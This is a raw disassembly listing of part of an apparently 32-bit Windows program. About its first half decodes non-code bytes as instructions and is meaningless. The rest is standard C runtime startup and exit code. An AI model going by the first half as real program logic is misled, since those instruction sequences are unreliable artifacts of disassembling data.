  4224b7:	je     0x4224aa
  4224b9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4224ba:	cld    
  4224bb:	call   0xb583:0x61121fe2
  4224c2:	inc    edi
  4224c3:	inc    esi
  4224c4:	arpl   WORD PTR [ecx+ebp*8-0x16e0e2cc],di
  4224cb:	out    dx,al
  4224cc:	sub    eax,0xec876d
  4224d1:	fdivp  st(2),st
  4224d3:	push   ebp
  4224d4:	push   0x1aa8e884
  4224d9:	cwde   
  4224da:	scas   eax,DWORD PTR es:[edi]
  4224db:	mov    cs,WORD PTR [edx-0x31]
  4224de:	mov    eax,ds:0xc00c9889
  4224e3:	inc    eax
  4224e4:	lock imul edi,DWORD PTR [esi],0x57
  4224e8:	mov    esp,0x9110556a
  4224ed:	adc    DWORD PTR [ecx+0xc],eax
  4224f0:	in     eax,dx
  4224f1:	sbb    DWORD PTR [ecx-0x42],0xffffff9f
  4224f5:	jmp    0x6018fa30
  4224fa:	cmp    al,0xd5
  4224fc:	xor    BYTE PTR [edi],cl
  4224fe:	push   ebx
  4224ff:	jne    0x422560
  422501:	fisttp DWORD PTR [eax]
  422504:	sti    
  422505:	and    ebx,DWORD PTR [eax-0x6]
  422508:	mov    edx,0xb55df330
  42250d:	jecxz  0x422560
  42250f:	ins    BYTE PTR es:[edi],dx
  422510:	mov    esp,0x7ef464e9
  422515:	and    eax,ebx
  422517:	push   0x15
  422519:	inc    ebp
  42251a:	pusha  
  42251b:	stos   BYTE PTR es:[edi],al
  42251c:	addr16 mov esp,0xada1fe38
  422522:	int    0xcc
  422524:	ss (bad) 
  422526:	mov    BYTE PTR [ecx-0x68bff497],bh
  42252c:	pop    ss
  42252d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42252e:	(bad)  
  42252f:	das    
  422530:	pop    ss
  422531:	adc    eax,0x9dce071e
  422536:	pop    esp
  422537:	out    dx,al
  422538:	ins    BYTE PTR es:[edi],dx
  422539:	xchg   BYTE PTR ds:0xf936b941,dl
  42253f:	loopne 0x422541
  422541:	repnz and eax,0x81b6506f
  422547:	out    0xfa,eax
  422549:	xor    al,0xcd
  42254b:	adc    ebx,ecx
  42254d:	xor    dl,BYTE PTR [esp+eax*8]
  422550:	sahf   
  422551:	mov    edx,0xee3cc05b
  422556:	(bad)  
  422557:	sub    bl,BYTE PTR [edx-0x24b0d236]
  42255d:	test   DWORD PTR [esi],0x2fd13c3d
  422563:	imul   ebx,DWORD PTR [edi-0x3e],0x34b4d849
  42256a:	xor    dh,dl
  42256c:	xchg   esi,eax
  42256d:	sar    BYTE PTR [eax+ebx*8],0xf
  422571:	shl    DWORD PTR [eax],cl
  422573:	ins    DWORD PTR es:[edi],dx
  422574:	inc    esp
  422575:	loope  0x42253c
  422577:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422578:	and    DWORD PTR [ebx-0x789965d8],edi
  42257e:	dec    esi
  42257f:	outs   dx,DWORD PTR ds:[esi]
  422580:	xchg   esp,eax
  422581:	scas   eax,DWORD PTR es:[edi]
  422582:	imul   esi,DWORD PTR [edx-0x3c6eb87d],0xb04d1c58
  42258c:	push   ss
  42258d:	(bad)  [ecx+0x50c819f8]
  422593:	push   0xffffffc5
  422595:	mov    cl,0xda
  422597:	xor    esi,DWORD PTR [ecx+0x10]
  42259a:	or     BYTE PTR [ebp+0x26],0x28
  42259e:	jmp    0xaea0:0x81a8042f
  4225a5:	ror    BYTE PTR [edx+0x3d6e2559],0xed
  4225ac:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4225ad:	mov    bh,0xf2
  4225af:	lods   eax,DWORD PTR ds:[esi]
  4225b0:	adc    al,ah
  4225b2:	inc    ecx
  4225b3:	mov    al,ds:0xfb01bb3c
  4225b8:	dec    ecx
  4225b9:	push   ebp
  4225ba:	call   0x54d0:0x88051db7
  4225c1:	adc    al,0x6a
  4225c3:	xor    esi,DWORD PTR [ebp+0x54f021b9]
  4225c9:	out    dx,eax
  4225ca:	xor    DWORD PTR [eax+0x45b92acb],eax
  4225d0:	inc    ebx
  4225d1:	stos   BYTE PTR es:[edi],al
  4225d2:	jle    0x4225b3
  4225d4:	pop    ds
  4225d5:	or     eax,0x3e424f4d
  4225da:	add    BYTE PTR [ecx+0xeda572d],ch
  4225e0:	xlat   BYTE PTR ds:[ebx]
  4225e1:	clc    
  4225e2:	imul   bh
  4225e4:	adc    ebx,DWORD PTR [ebp+0x16abdffe]
  4225ea:	int3   
  4225eb:	ret    0x6054
  4225ee:	xchg   BYTE PTR [edx-0x30fedb9d],dh
  4225f4:	jbe    0x4225e9
  4225f6:	jmp    0x3d6493ee
  4225fb:	pop    edi
  4225fc:	mov    ds:0xca0a1865,eax
  422601:	shl    DWORD PTR [edx+0x64],cl
  422604:	xchg   esi,eax
  422605:	jmp    0x4225a4
  422607:	jecxz  0x422624
  422609:	or     DWORD PTR [edx+0x401402c8],edx
  42260f:	sub    eax,eax
  422611:	inc    esi
  422612:	out    0x20,eax
  422614:	pop    ebx
  422615:	adc    edx,DWORD PTR [eax+0x42114eaa]
  42261b:	dec    esi
  42261c:	jmp    0x422643
  42261e:	cmp    eax,0x38fd51c3
  422623:	arpl   WORD PTR [edx],dx
  422625:	mov    eax,0xd538274b
  42262a:	fistp  DWORD PTR [esi+ebx*8]
  42262d:	jnp    0x422688
  42262f:	neg    BYTE PTR [ebp-0x2f]
  422632:	xor    DWORD PTR ds:0x2a529c9,ebp
  422638:	jb     0x4226b0
  42263a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42263b:	xor    BYTE PTR ds:0x1b67c15b,bh
  422641:	push   es
  422642:	ret    0xd01a
  422645:	pop    esi
  422646:	(bad)  
  422647:	imul   esi,esp,0x12
  42264a:	cmp    DWORD PTR [ebx+edi*4],esi
  42264d:	cs jno 0x42263e
  422650:	int    0x8c
  422652:	xchg   ebx,eax
  422653:	sbb    dh,BYTE PTR [edi]
  422655:	dec    eax
  422656:	inc    esi
  422657:	mov    cl,0xf3
  422659:	(bad)  
  42265a:	ret    0xa0c5
  42265d:	and    al,0x51
  42265f:	xchg   edi,eax
  422660:	ins    BYTE PTR es:[edi],dx
  422661:	jge    0x4226de
  422663:	test   al,0x95
  422665:	inc    edx
  422666:	shl    DWORD PTR [ebp+esi*8+0x13cbabd3],cl
  42266d:	(bad)  
  42266e:	retf   0x53af
  422671:	andnps xmm3,XMMWORD PTR [ecx]
  422674:	mov    cl,0x42
  422676:	aam    0xbf
  422678:	dec    edx
  422679:	adc    edx,DWORD PTR [ebx-0x1d8588fd]
  42267f:	scas   al,BYTE PTR es:[edi]
  422680:	es in  al,0xe4
  422683:	mov    cl,0x2f
  422685:	jg     0x42260f
  422687:	mov    al,0xc5
  422689:	int    0xf2
  42268b:	xchg   ecx,eax
  42268c:	push   0x7bf77616
  422691:	or     dl,BYTE PTR [ebx+ebp*1+0x32b74e80]
  422698:	xchg   esp,eax
  422699:	addr16 icebp 
  42269b:	rcr    esi,0xbe
  42269e:	arpl   WORD PTR [edi+0x483591],cx
  4226a4:	retf   0x92ff
  4226a7:	xchg   DWORD PTR [ebx+edi*8],ebp
  4226aa:	and    bl,ah
  4226ac:	rcr    DWORD PTR [ebp-0x2a],1
  4226af:	arpl   WORD PTR [esi-0x25],bp
  4226b2:	jecxz  0x4226cf
  4226b4:	aaa    
  4226b5:	mov    bh,0x38
  4226b7:	dec    edi
  4226b8:	call   0xa9a52a96
  4226bd:	jmp    0xfa3aa610
  4226c2:	cli    
  4226c3:	clc    
  4226c4:	mov    bh,0x75
  4226c6:	mov    ebp,0xb797de9c
  4226cb:	sub    DWORD PTR [edi+0x2f],eax
  4226ce:	popa   
  4226cf:	es adc eax,0xada53709
  4226d5:	jb     0x4226a4
  4226d7:	adc    al,0x6d
  4226d9:	add    al,0xd9
  4226db:	mov    bl,0x84
  4226dd:	or     DWORD PTR [ecx+eax*4+0x3f],esi
  4226e1:	(bad)  
  4226e2:	nop
  4226e3:	xor    al,0x31
  4226e5:	sub    esp,DWORD PTR [ebx+0x55]
  4226e8:	daa    
  4226e9:	inc    edx
  4226ea:	and    al,0x6e
  4226ec:	fcom   DWORD PTR fs:[edi+0x50880e93]
  4226f3:	xor    ebp,DWORD PTR [edx+0x29]
  4226f6:	addr16 adc al,0x77
  4226f9:	pop    ss
  4226fa:	adc    eax,0x25a7b2db
  4226ff:	daa    
  422700:	add    BYTE PTR [ecx],bh
  422702:	push   edi
  422703:	rcr    ecx,0x28
  422706:	addr16 jo 0x42273a
  422709:	push   esp
  42270a:	ins    DWORD PTR es:[edi],dx
  42270b:	and    al,0x42
  42270d:	ss test eax,0xbc42db1e
  422713:	add    al,0x62
  422715:	dec    edi
  422716:	mov    dl,0xc5
  422718:	repnz sub esi,DWORD PTR fs:[edx+edi*8+0x0]
  42271e:	and    eax,DWORD PTR [ecx]
  422720:	data16 sub BYTE PTR [eax-0x7c483220],al
  422727:	ror    DWORD PTR [edi],1
  422729:	inc    edx
  42272a:	push   eax
  42272b:	ins    DWORD PTR es:[edi],dx
  42272c:	stos   BYTE PTR es:[edi],al
  42272d:	imul   ebx,DWORD PTR [ebp+0x5d07af75],0x62
  422734:	pusha  
  422735:	cmp    eax,0x8d89d99
  42273a:	rcl    DWORD PTR [esi],0x6e
  42273d:	repnz sbb eax,0x225edc48
  422743:	push   ds
  422744:	mov    ecx,0x68540fed
  422749:	rcl    bh,1
  42274b:	outs   dx,DWORD PTR ds:[esi]
  42274c:	xor    dl,BYTE PTR [edi+ecx*4]
  42274f:	clc    
  422750:	js     0x422787
  422752:	lods   eax,DWORD PTR ds:[esi]
  422753:	jl     0x422727
  422755:	sbb    eax,0xa8a325ac
  42275a:	jo     0x4227b4
  42275c:	out    dx,al
  42275d:	inc    edx
  42275e:	dec    eax
  42275f:	fisubr WORD PTR [esi-0x14]
  422762:	hlt    
  422763:	fisubr WORD PTR [edi]
  422765:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422766:	push   esi
  422767:	repz aam 0x75
  42276a:	pushf  
  42276b:	cld    
  42276c:	outs   dx,DWORD PTR ds:[esi]
  42276d:	adc    DWORD PTR [ecx+0x57ca312f],0x71d06758
  422777:	aad    0x68
  422779:	js     0x422788
  42277b:	dec    eax
  42277c:	ror    BYTE PTR ds:0x8e900eac,1
  422782:	xor    dh,ch
  422784:	aam    0x26
  422786:	fisub  DWORD PTR [edx+ebp*1+0x4d75c2f5]
  42278d:	jbe    0x4227d5
  42278f:	xor    BYTE PTR [edi-0x3d],0xd5
  422793:	popf   
  422794:	in     eax,dx
  422795:	inc    esi
  422796:	cmp    DWORD PTR [esi+ebx*1-0x48],esp
  42279a:	enter  0x9c68,0xa8
  42279e:	mov    ebp,0xcc65a348
  4227a3:	bound  ecx,QWORD PTR [edx-0x6af6b20f]
  4227a9:	(bad)  
  4227aa:	xchg   ecx,eax
  4227ab:	push   ss
  4227ac:	call   0xa70fd44e
  4227b1:	fnstenv [esi-0x66]
  4227b4:	aad    0xc
  4227b6:	or     al,BYTE PTR [ecx-0x13dc5733]
  4227bc:	jl     0x422797
  4227be:	outs   dx,BYTE PTR ds:[esi]
  4227bf:	cmc    
  4227c0:	test   al,0x47
  4227c2:	adc    BYTE PTR [eax-0x8],al
  4227c5:	pop    eax
  4227c6:	push   ds
  4227c7:	and    esp,DWORD PTR [ecx+0x3963c216]
  4227cd:	cmp    BYTE PTR [edx-0x616cbff4],ch
  4227d3:	loop   0x42276e
  4227d5:	mov    cl,BYTE PTR [esp+eiz*2]
  4227d8:	cs jae 0x42283c
  4227db:	shl    BYTE PTR ds:0xf26afeab,0x8c
  4227e2:	mov    bl,0xf5
  4227e4:	xor    BYTE PTR [ebp+esi*4-0x2a930d7c],ah
  4227eb:	sub    DWORD PTR [edi+esi*2],esp
  4227ee:	mov    bh,0xab
  4227f0:	cmp    al,0x7d
  4227f2:	clc    
  4227f3:	mov    ds:0x82e682e1,eax
  4227f8:	rcr    BYTE PTR ds:0x3998bc17,0x71
  4227ff:	retf   0x832c
  422802:	jg     0x42282e
  422804:	ja     0x42280d
  422806:	js     0x422840
  422808:	daa    
  422809:	enter  0x145a,0x61
  42280d:	leave  
  42280e:	(bad)  
  42280f:	int3   
  422810:	in     al,dx
  422811:	mov    eax,ds:0x99c9914a
  422816:	repz test DWORD PTR [ecx+0x2b],esp
  42281a:	fisttp DWORD PTR [edi-0x674823a]
  422820:	dec    edi
  422821:	rcl    DWORD PTR [ebx+0x621fd626],1
  422827:	mov    DWORD PTR [ecx+0x5b],ebx
  42282a:	fbstp  TBYTE PTR [edx]
  42282c:	cmc    
  42282d:	cmp    al,ah
  42282f:	imul   edi,DWORD PTR [edi+esi*4-0x23],0xffffffd9
  422834:	into   
  422835:	mov    edx,0x59212bb6
  42283a:	sbb    al,0x91
  42283c:	out    dx,eax
  42283d:	and    DWORD PTR [edx],0xffffff9a
  422840:	push   cs
  422841:	push   edi
  422842:	das    
  422843:	pop    ds
  422844:	ins    BYTE PTR es:[edi],dx
  422845:	or     ecx,DWORD PTR [edi]
  422847:	sbb    eax,0xc9faab65
  42284c:	push   0x5f5b4633
  422851:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422852:	int    0x23
  422854:	lea    ecx,[edi+0x23]
  422857:	jbe    0x422872
  422859:	and    ecx,0x540eb931
  42285f:	push   ds
  422860:	or     BYTE PTR [esi-0x6eb8d5a0],al
  422866:	imul   esp,DWORD PTR [ebp+eiz*8+0xf],0x3de6b05
  42286e:	mov    BYTE PTR [edx+0x2d],cl
  422871:	test   ch,bl
  422873:	scas   eax,DWORD PTR es:[edi]
  422874:	repz sub DWORD PTR [eax],0xa8b511ad
  42287b:	push   cs
  42287c:	jne    0x4228d3
  42287e:	lods   eax,DWORD PTR ds:[esi]
  42287f:	push   ebp
  422880:	add    DWORD PTR [ecx],0x71ef8a7d
  422886:	cmp    bl,BYTE PTR [eax-0x13]
  422889:	push   edi
  42288a:	test   BYTE PTR [esi-0x1e],0x53
  42288e:	mov    al,ds:0x2d0f182e
  422893:	pop    ecx
  422894:	stos   DWORD PTR es:[edi],eax
  422895:	pop    esi
  422896:	loope  0x4228bc
  422898:	jmp    0xc4d3de0b
  42289d:	pop    esi
  42289e:	fnstcw WORD PTR [ebx+esi*1+0x44]
  4228a2:	leave  
  4228a3:	jl     0x422879
  4228a5:	ror    DWORD PTR [edx-0x74a8d97e],1
  4228ab:	and    eax,DWORD PTR [ebx+0x1b]
  4228ae:	leave  
  4228af:	mov    bh,0x10
  4228b1:	(bad)  [ebp-0x28d4a745]
  4228b7:	xchg   ebx,eax
  4228b8:	xor    eax,0x87642a17
  4228bd:	pop    edi
  4228be:	repz add ebp,ebp
  4228c1:	mov    edx,0x32b0d799
  4228c6:	mov    edi,0x42bc8ae3
  4228cb:	push   edx
  4228cc:	lea    ebp,[ebp+eiz*1+0x73]
  4228d0:	cmp    BYTE PTR [ebx+ebp*4+0x2b],cl
  4228d4:	in     al,dx
  4228d5:	je     0x42288e
  4228d7:	das    
  4228d8:	mov    WORD PTR [ecx-0x17],cs
  4228db:	icebp  
  4228dc:	adc    DWORD PTR [edx+0x33],ebx
  4228df:	xor    DWORD PTR [ebp+0x505075c5],ebp
  4228e5:	dec    esp
  4228e6:	or     DWORD PTR [edi],esp
  4228e8:	cmp    eax,0x8d3888ce
  4228ed:	and    edx,DWORD PTR [eax]
  4228ef:	pop    ss
  4228f0:	dec    ebp
  4228f1:	pop    ecx
  4228f2:	mov    ds:0xdfb12fa0,eax
  4228f7:	in     al,0x2b
  4228f9:	sar    BYTE PTR [ecx],cl
  4228fb:	xchg   esp,eax
  4228fc:	pop    edx
  4228fd:	(bad)  
  4228fe:	sti    
  4228ff:	test   DWORD PTR [esi-0x4ad31d0d],esi
  422905:	push   ss
  422906:	addr16 mov bl,0xc3
  422909:	jnp    0x422890
  42290b:	jnp    0x42294e
  42290d:	fld    DWORD PTR [edi]
  42290f:	adc    bh,bl
  422911:	ins    BYTE PTR es:[edi],dx
  422912:	mov    DWORD PTR [edi+0x5038620],esi
  422918:	cmc    
  422919:	(bad)  
  42291a:	enter  0x9a44,0x32
  42291e:	adc    BYTE PTR [edi+0x54e763a4],cl
  422924:	xchg   edx,eax
  422925:	mov    DWORD PTR [edx+0x597b841c],edi
  42292b:	push   ds
  42292c:	pop    ds
  42292d:	mov    ah,0xbb
  42292f:	mov    cl,0x7a
  422931:	ja     0x4228fd
  422933:	push   ds
  422934:	inc    edi
  422935:	xchg   edi,eax
  422936:	loopne 0x42298c
  422938:	adc    edi,DWORD PTR [edx*4+0x4f27a59e]
  42293f:	out    dx,eax
  422940:	xor    eax,0x5478475e
  422945:	mov    BYTE PTR [ebx-0xf],ch
  422948:	or     eax,edx
  42294a:	popa   
  42294b:	out    dx,al
  42294c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42294d:	icebp  
  42294e:	subps  xmm5,XMMWORD PTR [esi]
  422951:	xchg   edi,eax
  422952:	or     al,0xd4
  422954:	es push cs
  422956:	mov    ds:0x337d7fea,al
  42295b:	rol    BYTE PTR [ebx+0x10c210c4],0x0
  422962:	nop
  422963:	nop
  422964:	nop
  422965:	nop
  422966:	nop
  422967:	nop
  422968:	nop
  422969:	nop
  42296a:	nop
  42296b:	nop
  42296c:	nop
  42296d:	nop
  42296e:	nop
  42296f:	nop
  422970:	cmp    DWORD PTR ds:0x45cabc,0x1
  422977:	jne    0x42297e
  422979:	call   0x422ebc
  42297e:	push   DWORD PTR [esp+0x4]
  422982:	call   0x422d45
  422987:	push   0xff
  42298c:	call   DWORD PTR ds:0x45c1c0
  422992:	pop    ecx
  422993:	pop    ecx
  422994:	ret    
  422995:	cmp    DWORD PTR ds:0x45cabc,0x1
  42299c:	jne    0x4229a3
  42299e:	call   0x422ebc
  4229a3:	push   DWORD PTR [esp+0x4]
  4229a7:	call   0x422d45
  4229ac:	push   0xff
  4229b1:	call   0x422b8b
  4229b6:	pop    ecx
  4229b7:	pop    ecx
  4229b8:	ret    
  4229b9:	push   0x60
  4229bb:	push   0x428118
  4229c0:	call   0x4238a8
  4229c5:	mov    edi,0x94
  4229ca:	mov    eax,edi
  4229cc:	call   0x423900
  4229d1:	mov    DWORD PTR [ebp-0x18],esp
  4229d4:	mov    esi,esp
  4229d6:	mov    DWORD PTR [esi],edi
  4229d8:	push   esi
  4229d9:	call   DWORD PTR ds:0x428028
  4229df:	mov    ecx,DWORD PTR [esi+0x10]
  4229e2:	mov    DWORD PTR ds:0x45cac4,ecx
  4229e8:	mov    eax,DWORD PTR [esi+0x4]
  4229eb:	mov    ds:0x45cad0,eax
  4229f0:	mov    edx,DWORD PTR [esi+0x8]
  4229f3:	mov    DWORD PTR ds:0x45cad4,edx
  4229f9:	mov    esi,DWORD PTR [esi+0xc]
  4229fc:	and    esi,0x7fff
  422a02:	mov    DWORD PTR ds:0x45cac8,esi
  422a08:	cmp    ecx,0x2
  422a0b:	je     0x422a19
  422a0d:	or     esi,0x8000
  422a13:	mov    DWORD PTR ds:0x45cac8,esi
  422a19:	shl    eax,0x8
  422a1c:	add    eax,edx
  422a1e:	mov    ds:0x45cacc,eax
  422a23:	xor    esi,esi
  422a25:	push   esi
  422a26:	mov    edi,DWORD PTR ds:0x428018
  422a2c:	call   edi
  422a2e:	cmp    WORD PTR [eax],0x5a4d
  422a33:	jne    0x422a54
  422a35:	mov    ecx,DWORD PTR [eax+0x3c]
  422a38:	add    ecx,eax
  422a3a:	cmp    DWORD PTR [ecx],0x4550
  422a40:	jne    0x422a54
  422a42:	movzx  eax,WORD PTR [ecx+0x18]
  422a46:	cmp    eax,0x10b
  422a4b:	je     0x422a6c
  422a4d:	cmp    eax,0x20b
  422a52:	je     0x422a59
  422a54:	mov    DWORD PTR [ebp-0x1c],esi
  422a57:	jmp    0x422a80
  422a59:	cmp    DWORD PTR [ecx+0x84],0xe
  422a60:	jbe    0x422a54
  422a62:	xor    eax,eax
  422a64:	cmp    DWORD PTR [ecx+0xf8],esi
  422a6a:	jmp    0x422a7a
  422a6c:	cmp    DWORD PTR [ecx+0x74],0xe
  422a70:	jbe    0x422a54
  422a72:	xor    eax,eax
  422a74:	cmp    DWORD PTR [ecx+0xe8],esi
  422a7a:	setne  al
  422a7d:	mov    DWORD PTR [ebp-0x1c],eax
  422a80:	push   0x1
  422a82:	call   0x423857
  422a87:	pop    ecx
  422a88:	test   eax,eax
  422a8a:	jne    0x422a94
  422a8c:	push   0x1c
  422a8e:	call   0x422995
  422a93:	pop    ecx
  422a94:	call   0x4237ce
  422a99:	test   eax,eax
  422a9b:	jne    0x422aa5
  422a9d:	push   0x10
  422a9f:	call   0x422995
  422aa4:	pop    ecx
  422aa5:	call   0x4236b7
  422aaa:	mov    DWORD PTR [ebp-0x4],esi
  422aad:	call   0x4234b9
  422ab2:	test   eax,eax
  422ab4:	jge    0x422abe
  422ab6:	push   0x1b
  422ab8:	call   0x422970
  422abd:	pop    ecx
  422abe:	call   DWORD PTR ds:0x428024
  422ac4:	mov    ds:0x45d274,eax
  422ac9:	call   0x423397
  422ace:	mov    ds:0x45cab4,eax
  422ad3:	call   0x4232f5
  422ad8:	test   eax,eax
  422ada:	jge    0x422ae4
  422adc:	push   0x8
  422ade:	call   0x422970
  422ae3:	pop    ecx
  422ae4:	call   0x4230c2
  422ae9:	test   eax,eax
  422aeb:	jge    0x422af5
  422aed:	push   0x9
  422aef:	call   0x422970
  422af4:	pop    ecx
  422af5:	call   0x422bcd
  422afa:	mov    DWORD PTR [ebp-0x20],eax
  422afd:	cmp    eax,esi
  422aff:	je     0x422b08
  422b01:	push   eax
  422b02:	call   0x422970
  422b07:	pop    ecx
  422b08:	mov    DWORD PTR [ebp-0x38],esi
  422b0b:	lea    eax,[ebp-0x64]
  422b0e:	push   eax
  422b0f:	call   DWORD PTR ds:0x428020
  422b15:	call   0x423059
  422b1a:	mov    DWORD PTR [ebp-0x68],eax
  422b1d:	test   BYTE PTR [ebp-0x38],0x1
  422b21:	je     0x422b29
  422b23:	movzx  eax,WORD PTR [ebp-0x34]
  422b27:	jmp    0x422b2c
  422b29:	push   0xa
  422b2b:	pop    eax
  422b2c:	push   eax
  422b2d:	push   DWORD PTR [ebp-0x68]
  422b30:	push   esi
  422b31:	push   esi
  422b32:	call   edi
  422b34:	push   eax
  422b35:	call   0x421800
  422b3a:	mov    edi,eax
  422b3c:	mov    DWORD PTR [ebp-0x6c],edi
  422b3f:	cmp    DWORD PTR [ebp-0x1c],esi
  422b42:	jne    0x422b4a
  422b44:	push   edi
  422b45:	call   0x422d05
  422b4a:	call   0x422d27
  422b4f:	jmp    0x422b7c
  422b51:	mov    eax,DWORD PTR [ebp-0x14]
  422b54:	mov    ecx,DWORD PTR [eax]
  422b56:	mov    ecx,DWORD PTR [ecx]
  422b58:	mov    DWORD PTR [ebp-0x70],ecx
  422b5b:	push   eax
  422b5c:	push   ecx
  422b5d:	call   0x422ef5
  422b62:	pop    ecx
  422b63:	pop    ecx
  422b64:	ret    
  422b65:	mov    esp,DWORD PTR [ebp-0x18]
  422b68:	mov    edi,DWORD PTR [ebp-0x70]
  422b6b:	cmp    DWORD PTR [ebp-0x1c],0x0
  422b6f:	jne    0x422b77
  422b71:	push   edi
  422b72:	call   0x422d16
  422b77:	call   0x422d36
  422b7c:	or     DWORD PTR [ebp-0x4],0xffffffff
  422b80:	mov    eax,edi
  422b82:	lea    esp,[ebp-0x7c]
  422b85:	call   0x4238e3
  422b8a:	ret    
  422b8b:	push   0x428134
  422b90:	call   DWORD PTR ds:0x428018
  422b96:	test   eax,eax
  422b98:	je     0x422bb0
  422b9a:	push   0x428124
  422b9f:	push   eax
  422ba0:	call   DWORD PTR ds:0x42801c
  422ba6:	test   eax,eax
  422ba8:	je     0x422bb0
  422baa:	push   DWORD PTR [esp+0x4]
  422bae:	call   eax
  422bb0:	push   DWORD PTR [esp+0x4]
  422bb4:	call   DWORD PTR ds:0x42802c
  422bba:	int3   
  422bbb:	push   0x8
  422bbd:	call   0x423a6f
  422bc2:	pop    ecx
  422bc3:	ret    
  422bc4:	push   0x8
  422bc6:	call   0x4239db
  422bcb:	pop    ecx
  422bcc:	ret    
  422bcd:	mov    eax,ds:0x45d270
  422bd2:	test   eax,eax
  422bd4:	je     0x422bd8
  422bd6:	call   eax
  422bd8:	push   esi
  422bd9:	push   edi
  422bda:	mov    ecx,0x42a00c
  422bdf:	mov    edi,0x42a018
  422be4:	xor    eax,eax
  422be6:	cmp    ecx,edi
  422be8:	mov    esi,ecx
  422bea:	jae    0x422c03
  422bec:	test   eax,eax
  422bee:	jne    0x422c2f
  422bf0:	mov    ecx,DWORD PTR [esi]
  422bf2:	test   ecx,ecx
  422bf4:	je     0x422bf8
  422bf6:	call   ecx
  422bf8:	add    esi,0x4
  422bfb:	cmp    esi,edi
  422bfd:	jb     0x422bec
  422bff:	test   eax,eax
  422c01:	jne    0x422c2f
  422c03:	push   0x4236fb
  422c08:	call   0x423b80
  422c0d:	mov    esi,0x42a000
  422c12:	mov    eax,esi
  422c14:	mov    edi,0x42a008
  422c19:	cmp    eax,edi
  422c1b:	pop    ecx
  422c1c:	jae    0x422c2d
  422c1e:	mov    eax,DWORD PTR [esi]
  422c20:	test   eax,eax
  422c22:	je     0x422c26
  422c24:	call   eax
  422c26:	add    esi,0x4
  422c29:	cmp    esi,edi
  422c2b:	jb     0x422c1e
  422c2d:	xor    eax,eax
  422c2f:	pop    edi
  422c30:	pop    esi
  422c31:	ret    
  422c32:	push   ebp
  422c33:	mov    ebp,esp
  422c35:	push   esi
  422c36:	push   edi
  422c37:	push   0x8
  422c39:	call   0x423a6f
  422c3e:	xor    esi,esi
  422c40:	inc    esi
  422c41:	cmp    DWORD PTR ds:0x45cb04,esi
  422c47:	pop    ecx
  422c48:	jne    0x422c5a
  422c4a:	push   DWORD PTR [ebp+0x8]
  422c4d:	call   DWORD PTR ds:0x428034
  422c53:	push   eax
  422c54:	call   DWORD PTR ds:0x428030
  422c5a:	cmp    DWORD PTR [ebp+0xc],0x0
  422c5e:	mov    al,BYTE PTR [ebp+0x10]
  422c61:	mov    DWORD PTR ds:0x45cb00,esi
  422c67:	mov    ds:0x45cafc,al
  422c6c:	jne    0x422cc0
  422c6e:	mov    ecx,DWORD PTR ds:0x45d268
  422c74:	test   ecx,ecx
  422c76:	je     0x422ca1
  422c78:	mov    eax,ds:0x45d264
  422c7d:	sub    eax,0x4
  422c80:	cmp    eax,ecx
  422c82:	jmp    0x422c9a
  422c84:	mov    eax,DWORD PTR [eax]
  422c86:	test   eax,eax
  422c88:	je     0x422c8c
  422c8a:	call   eax
  422c8c:	mov    eax,ds:0x45d264
  422c91:	sub    eax,0x4
  422c94:	cmp    eax,DWORD PTR ds:0x45d268
  422c9a:	mov    ds:0x45d264,eax
  422c9f:	jae    0x422c84
  422ca1:	mov    eax,0x42a01c
  422ca6:	mov    esi,0x42a020
  422cab:	cmp    eax,esi
  422cad:	mov    edi,eax
  422caf:	jae    0x422cc0
  422cb1:	mov    eax,DWORD PTR [edi]
  422cb3:	test   eax,eax
  422cb5:	je     0x422cb9
  422cb7:	call   eax
  422cb9:	add    edi,0x4
  422cbc:	cmp    edi,esi
  422cbe:	jb     0x422cb1
  422cc0:	mov    eax,0x42a024
  422cc5:	mov    esi,0x42a028
  422cca:	cmp    eax,esi
  422ccc:	mov    edi,eax
  422cce:	jae    0x422cdf
  422cd0:	mov    eax,DWORD PTR [edi]
  422cd2:	test   eax,eax
  422cd4:	je     0x422cd8
  422cd6:	call   eax
  422cd8:	add    edi,0x4
  422cdb:	cmp    edi,esi
  422cdd:	jb     0x422cd0
  422cdf:	cmp    DWORD PTR [ebp+0x10],0x0
  422ce3:	pop    edi
  422ce4:	pop    esi
  422ce5:	je     0x422cf0
  422ce7:	push   0x8
  422ce9:	call   0x4239db
  422cee:	jmp    0x422d02
  422cf0:	push   DWORD PTR [ebp+0x8]
  422cf3:	mov    DWORD PTR ds:0x45cb04,0x1
  422cfd:	call   0x422b8b
  422d02:	pop    ecx
  422d03:	pop    ebp
  422d04:	ret    
  422d05:	push   0x0
  422d07:	push   0x0
  422d09:	push   DWORD PTR [esp+0xc]
  422d0d:	call   0x422c32
  422d12:	add    esp,0xc
  422d15:	ret    
  422d16:	push   0x0
  422d18:	push   0x1
  422d1a:	push   DWORD PTR [esp+0xc]
  422d1e:	call   0x422c32
  422d23:	add    esp,0xc
  422d26:	ret    
  422d27:	push   0x1
  422d29:	push   0x0
  422d2b:	push   0x0
  422d2d:	call   0x422c32
  422d32:	add    esp,0xc
  422d35:	ret    
  422d36:	push   0x1
  422d38:	push   0x1
  422d3a:	push   0x0
  422d3c:	call   0x422c32
  422d41:	add    esp,0xc
  422d44:	ret    
  422d45:	push   ebp
  422d46:	mov    ebp,esp
  422d48:	sub    esp,0x10c
  422d4e:	mov    eax,ds:0x45c430
  422d53:	xor    eax,DWORD PTR [ebp+0x4]
  422d56:	mov    ecx,DWORD PTR [ebp+0x8]
  422d59:	push   ebx
  422d5a:	push   esi
  422d5b:	mov    DWORD PTR [ebp-0x4],eax
  422d5e:	xor    edx,edx
  422d60:	push   edi
  422d61:	xor    eax,eax
  422d63:	cmp    ecx,DWORD PTR [eax*8+0x45c1c8]
  422d6a:	je     0x422d72
  422d6c:	inc    eax
  422d6d:	cmp    eax,0x12
  422d70:	jb     0x422d63
  422d72:	mov    esi,eax
  422d74:	shl    esi,0x3
  422d77:	cmp    ecx,DWORD PTR [esi+0x45c1c8]
  422d7d:	jne    0x422ea6
  422d83:	mov    eax,ds:0x45cabc
  422d88:	cmp    eax,0x1
  422d8b:	je     0x422e81
  422d91:	cmp    eax,edx
